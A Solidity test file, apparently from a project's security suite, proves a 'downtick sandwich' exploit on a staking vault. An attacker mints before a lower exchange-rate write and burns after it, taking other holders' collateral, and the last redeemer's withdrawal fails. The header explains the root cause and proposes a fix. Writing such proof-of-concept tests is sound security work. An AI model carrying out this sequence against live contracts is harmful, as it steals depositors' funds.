// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {IERC20Errors} from "@openzeppelin/contracts/interfaces/draft-IERC6093.sol";

import {SecurityBase} from "./SecurityBase.t.sol";

/**
 * @title DowntickSandwichTest
 * @notice An attacker with no prior position sandwiches a downward rate write and leaves
 *         with other holders' collateral.
 *
 * @dev **Root cause.** `_settle` pays `floor(unlocked0G / er_now)` a0G and never compares that
 *      to the a0G the position actually deposited. Positions record 0G value only, by design,
 *      so a rate that has fallen since the mint pays out *more* a0G than came in:
 *
 *          t0  Carol mints d at er0         pays     ceil(L / er0) a0G
 *          t1  a write lands: er_lo < er0
 *          t2  Carol burns d                receives floor(L / er_lo) a0G  -- more
 *
 *      Her profit, `L * (1/er_lo - 1/er0)`, is other positions' cover. A fall leaves every
 *      position owed more a0G than the vault holds (that much is R5), and a *transient* fall
 *      heals by itself when the rate recovers -- unless somebody cashes their share of the gap
 *      out while it is open. Carol does exactly that, so when the rate recovers the vault is
 *      short by precisely her profit, `harvest` returns 0 (no surplus, nothing reverts, every
 *      view keeps answering), and the hole lands on whoever redeems last -- first come, first
 *      served, no pro-rata haircut. Stakers must clear the registry's cooldown before they even hold their iAI
 *      again, so they are structurally last. The size is bounded by cap headroom in that block,
 *      not by anything the attacker owns.
 *
 *      This is the active form of accepted risk R5. R5 prices in that a falling rate leaves
 *      late redeemers short as a passive market outcome; this suite shows an attacker can
 *      *manufacture* that shortfall from a transient dip that would otherwise have cost nobody
 *      anything (see the control test).
 *
 *      **How a downtick reaches the chain now that the keeper is a bot.** `Oracle.setValue`
 *      itself still has no bounds and no monotonicity requirement -- any `SET_VALUE_ROLE` holder
 *      can write any number. But the automated keeper (`mellow-interop-bot`) refuses to write a
 *      decrease larger than 1 gwei and raises an alert instead (`is_decrease`), so the accidental
 *      "keeper writes a lower number" trigger is gone; `test_TheKeeperBotRefusesTheDowntick`
 *      pins that with the bot's own arithmetic. What remains is the path the bot's README
 *      documents as the recovery for a *real* fall (slashing, or correcting an over-print):
 *      `cli.py oracle-propose` builds `setValue` with `force=True` -- no guards, optional
 *      hand-typed `--value` -- and posts it to the public Safe transaction service, where it
 *      sits until signers approve. Every `_safeWrite(erLo)` below stands for that transaction.
 *
 *      So the bot lowers the probability and changes the timing, and leaves the mechanism
 *      intact. If anything the sandwich gets easier: a mempool race becomes a proposal that is
 *      publicly visible for hours or days before it executes. Carol mints when the proposal
 *      appears and burns when it lands.
 *
 *      **Fix.** Track a0G deposited per position and pay `min(value-based, pro-rata deposited)`;
 *      a minimum holding period on `burn` also closes the atomic form. Nothing in the keeper
 *      can close it, because the write that triggers it is the one the keeper hands to humans.
 */
contract DowntickSandwichTest is SecurityBase {
    /// @dev Foundation pre-mint stand-in: the honest early holder whose collateral is at risk.
    uint256 internal constant PRE_MINT = 2_000e18;
    /// @dev An honest public minter who happens to redeem before the foundation.
    uint256 internal constant HONEST_D = 100e18;
    /// @dev The attacker's size, bounded only by cap headroom in that block.
    uint256 internal constant ATTACK_D = 1_000e18;

    uint256 internal er0;
    /// @dev A modest -1% write: a small slashing event, or a keeper correction.
    uint256 internal erLo;

    function setUp() public override {
        super.setUp();
        er0 = vault.exchangeRate();
        // Exactly 1% down, floored, so the drop is on -- not past -- the bot's deviation
        // boundary and the *decrease* guard is provably the one that refuses it.
        erLo = er0 - er0 / 100;

        // The honest holders, in redemption order: alice stands in for the foundation
        // pre-mint (last out), bob for a public minter (first out).
        _mintFor(alice, PRE_MINT);
        _mintFor(bob, HONEST_D);
    }

    /**
     * @notice The keeper bot will not write this value; only the Safe path can.
     * @dev -1% is exactly on the deviation boundary (allowed: the bot uses `>`), but it is a
     *      decrease of ~1.1e16 wei against a tolerance of 1e9, so `is_decrease` refuses. The
     *      refusal is an alert, not a fix: the on-chain value stays at er0 until a human acts.
     */
    function test_TheKeeperBotRefusesTheDowntick_SoItArrivesViaTheSafe() public view {
        assertFalse(_botExceedsDeviation(er0, erLo), "-1% sits on the deviation boundary and passes it");
        assertTrue(_botIsDecrease(er0, erLo), "but it is a decrease far above the 1 gwei tolerance");
        assertTrue(_botWouldRefuse(er0, erLo), "so the automated heartbeat refuses to write it");
        // The contract itself would take it from any SET_VALUE_ROLE holder; the guard is off-chain.
        // (_safeWrite below is that path.)
    }

    /**
     * @notice The core broken property in isolation: after a downtick, a burn pays out more a0G
     *         than the position ever deposited, and nothing in `_settle` notices.
     * @dev No time passes and no yield accrues between Carol's mint and her burn, so every wei
     *      above her deposit is other positions' cover, not appreciation.
     */
    function test_ADowntickLetsABurnWithdrawMoreThanThePositionDeposited() public {
        uint256 paid = _mintFor(carol, ATTACK_D);
        uint256 L = _locked(carol);
        assertEq(paid, _a0GIn(L, er0), "mint charged ceil(L / er0)");

        _safeWrite(erLo);

        (, uint256 quoted) = vault.quoteBurn(carol, ATTACK_D);
        assertEq(quoted, _a0GOut(L, erLo), "quote is floor(L / er_lo)");
        assertGt(quoted, paid, "payout exceeds deposit: nothing caps at what came in");

        _burn(carol, ATTACK_D);
        assertEq(a0g.balanceOf(carol), quoted, "and the burn actually pays it");
    }

    /**
     * @notice The full sandwich: Carol's profit is, to the wei, the vault's shortfall once the
     *         rate recovers -- and the last redeemer's burn reverts by exactly that amount.
     */
    function test_SandwichingTheDowntickWithdrawsOtherHoldersCollateral() public {
        // Before Carol the vault is covered, over by at most 1 wei of ceiling dust
        // (ceil(a) + ceil(b) - ceil(a + b) is 0 or 1).
        _assertSolvent();
        uint256 dust = a0g.balanceOf(address(vault)) - _owed(er0);
        assertLe(dust, 1, "initial over-collateralisation is ceiling dust");

        // t0: Carol mints at er0. She needs no prior position -- only capital and cap headroom.
        uint256 paid = _mintFor(carol, ATTACK_D);
        uint256 L = _locked(carol);
        _assertSolvent();

        // t1: the downward write lands -- via the Safe, since the bot refuses it.
        _safeWrite(erLo);

        // t2: Carol burns everything at er_lo and leaves with the difference.
        _burn(carol, ATTACK_D);
        uint256 profit = a0g.balanceOf(carol) - paid;
        assertEq(profit, _a0GOut(L, erLo) - _a0GIn(L, er0), "profit = floor(L/er_lo) - ceil(L/er0)");
        assertGt(profit, 0, "the sandwich pays");

        // While the rate is down every position is owed more a0G than the vault holds -- that
        // is plain R5, and it would heal on its own when the rate recovers. Carol has taken her
        // share of that transient shortfall out in cash, so it no longer heals.
        assertLt(a0g.balanceOf(address(vault)), _owed(erLo), "under-covered at er_lo, as any fall implies");

        // t3: the rate recovers (the keeper's next heartbeat, or a Safe correction). At the
        // true rate the vault is now short by exactly what Carol took, less the initial dust.
        _safeWrite(er0);
        uint256 held = a0g.balanceOf(address(vault));
        uint256 owed = _owed(er0);
        assertLt(held, owed, "the vault no longer covers its obligations");
        assertEq(owed - held, profit - dust, "the hole is Carol's profit, to the wei");

        // Nothing surfaces it: there is no surplus, so the sweep goes quiet rather than
        // reverting, and every quote keeps answering.
        assertEq(vault.harvest(), 0, "no surplus betrays the shortfall");

        // Bob redeems first and is made whole -- the shortfall is invisible to him.
        (, uint256 bobQuoted) = vault.quoteBurn(bob, HONEST_D);
        _burn(bob, HONEST_D);
        assertEq(a0g.balanceOf(bob), bobQuoted, "early redeemers are paid in full");

        // Alice redeems last. Her entitlement is intact on paper; the a0G behind it left with
        // Carol, and her burn reverts on the transfer by exactly the missing amount.
        (, uint256 aliceOwed) = vault.quoteBurn(alice, PRE_MINT);
        uint256 remaining = a0g.balanceOf(address(vault));
        assertGt(aliceOwed, remaining, "the last redeemer cannot be covered");

        vm.expectRevert(
            abi.encodeWithSelector(
                IERC20Errors.ERC20InsufficientBalance.selector, address(vault), remaining, aliceOwed
            )
        );
        vm.prank(alice);
        vault.burn(PRE_MINT, block.timestamp);
    }

    /**
     * @notice The shortfall scales with the attacker's size, not with anything they own: Carol
     *         takes all remaining cap headroom and the hole is proportionally larger.
     */
    function test_TheHoleIsSizedByCapHeadroomNotByTheAttacker() public {
        uint256 headroom = vault.remainingCap();
        assertGt(headroom, ATTACK_D, "there is more headroom than the modest case used");

        uint256 paid = _mintFor(carol, headroom);
        uint256 L = _locked(carol);
        assertEq(vault.remainingCap(), 0, "Carol took the whole cap");

        _safeWrite(erLo);
        _burn(carol, headroom);
        uint256 profit = a0g.balanceOf(carol) - paid;
        assertEq(profit, _a0GOut(L, erLo) - _a0GIn(L, er0), "profit = floor(L/er_lo) - ceil(L/er0)");

        _safeWrite(er0);
        uint256 shortfall = _owed(er0) - a0g.balanceOf(address(vault));
        // Roughly 1% of everything Carol put through, drawn from the two honest positions.
        assertApproxEqRel(shortfall, paid / 100, 0.02e18, "~1% of the attack size");
        assertGt(shortfall, _a0GIn(_locked(bob), er0), "larger than bob's entire deposit");
    }

    /**
     * @notice Control: the same dip with nobody trading through it costs nobody anything.
     * @dev Carol holds an identical position but simply sits through the dip. Once the rate
     *      recovers the vault is covered and every holder -- Carol included -- exits whole. The
     *      loss in the sandwich test is therefore manufactured by the burn inside the dip, not by
     *      the rate move itself.
     */
    function test_Control_TheDipAloneCostsNobody() public {
        uint256 paid = _mintFor(carol, ATTACK_D);

        _safeWrite(erLo);
        _safeWrite(er0);
        _assertSolvent();

        _burn(carol, ATTACK_D);
        assertLe(paid - a0g.balanceOf(carol), 1, "Carol gets her deposit back (R2 dust)");
        _burn(bob, HONEST_D);
        _burn(alice, PRE_MINT);

        (uint256 locked, uint256 outstanding,) = vault.positionOf(alice);
        assertEq(locked, 0, "everyone exits in full");
        assertEq(outstanding, 0, "everyone exits in full");
        assertEq(vault.totalLocked0G(), 0, "nothing left owed");
        assertEq(iai.totalSupply(), 0, "and no iAI left behind");
    }
}
